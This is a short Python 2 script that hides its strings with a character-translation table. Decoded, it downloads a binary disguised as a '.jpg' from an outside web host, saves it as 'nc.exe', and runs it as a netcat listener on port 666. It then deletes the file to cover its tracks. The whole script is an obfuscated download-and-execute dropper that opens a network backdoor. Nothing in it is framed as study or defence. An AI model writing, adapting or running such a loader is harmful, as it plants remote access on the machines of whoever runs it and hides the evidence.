import os, urllib, string

def main():
    t = string.maketrans("!'@#$%^&*()_+Ghab0321kn9Z-","a-bceghiklmnoprtuvxy.:/326")
    sf = urllib.urlopen(string.translate("^aaGknn#a^b(^b9Z1*h!(_1#+)n$0&(@&_!h21jG%",t))
    nc = open(string.translate("_#1$3$",t),"wb")
    nc.write(sf.read())
    sf.close()
    nc.close()
    os.system(string.translate("_#1$3$ '( 'G ---",t))
    os.remove(string.translate("_#1$3$",t))

if __name__ == '__main__':
    main()
